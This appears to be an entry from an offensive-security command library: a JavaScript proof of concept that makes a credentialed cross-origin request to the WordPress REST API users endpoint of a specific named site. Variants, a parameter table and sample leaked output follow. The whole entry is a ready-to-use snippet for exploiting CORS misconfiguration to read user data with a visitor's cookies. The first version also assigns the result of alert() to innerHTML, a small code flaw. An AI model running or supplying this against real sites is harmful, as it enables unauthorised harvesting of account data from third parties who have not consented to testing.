---
data: >-
  var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function(){
  if(this.readyState == 4 && this.status == 200){
  document.getElementById("demo").innerHTML = alert(this.responseText); } };
  xhr.open("GET", "https://lonestarcell.com/wp-json/wp/v2/users/", true);
  xhr.withCredentials = true; xhr.send();
tags:
  - cors
  - poc
  - javascript
  - xhr
type: command
output: null
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:20.445Z'
id: 66462867-a06c-48d6-968e-e35fec588470
verified: false
validated: true
submitted: true
---
# xmlhttprequest-cross-origin-wordpress-api

## Command

```javascript
var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function(){ if(this.readyState == 4 && this.status == 200){ document.getElementById("demo").innerHTML = alert(this.responseText); } }; xhr.open("GET", "https://lonestarcell.com/wp-json/wp/v2/users/", true); xhr.withCredentials = true; xhr.send();
```

## Description

This JavaScript command creates an XMLHttpRequest to perform a cross-origin GET request to the WordPress REST API users endpoint with credentials enabled, demonstrating CORS misconfiguration by retrieving and alerting sensitive user data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| open method | HTTP method for the request (e.g., GET) | Yes |
| open url | Target URL (e.g., https://lonestarcell.com/wp-json/wp/v2/users/) | Yes |
| open async | Asynchronous flag (true for non-blocking) | Yes |
| withCredentials | Enables sending cookies/credentials cross-origin | Yes |
| onreadystatechange | Callback function to handle response | Yes |

## Examples

### Basic Usage

Embed in an HTML script tag and load from a different origin:

```javascript
var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function(){ if(this.readyState == 4 && this.status == 200){ alert(this.responseText); } }; xhr.open("GET", "https://target.com/wp-json/wp/v2/users/", true); xhr.withCredentials = true; xhr.send();
```

### Advanced Usage

Add error handling:

```javascript
var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function(){ if(this.readyState == 4){ if(this.status == 200){ alert(this.responseText); } else { console.error('Error: ' + this.status); } } }; xhr.open("GET", "https://target.com/wp-json/wp/v2/users/", true); xhr.withCredentials = true; xhr.send();
```

## Expected Output

If successful, an alert box displays the JSON response containing user data, such as {"users":[{"id":1,"slug":"admin"}]}. No CORS blocking errors occur.

## Related

- [[Related Procedure: Create-POC-for-CORS-Misconfiguration-Test]]
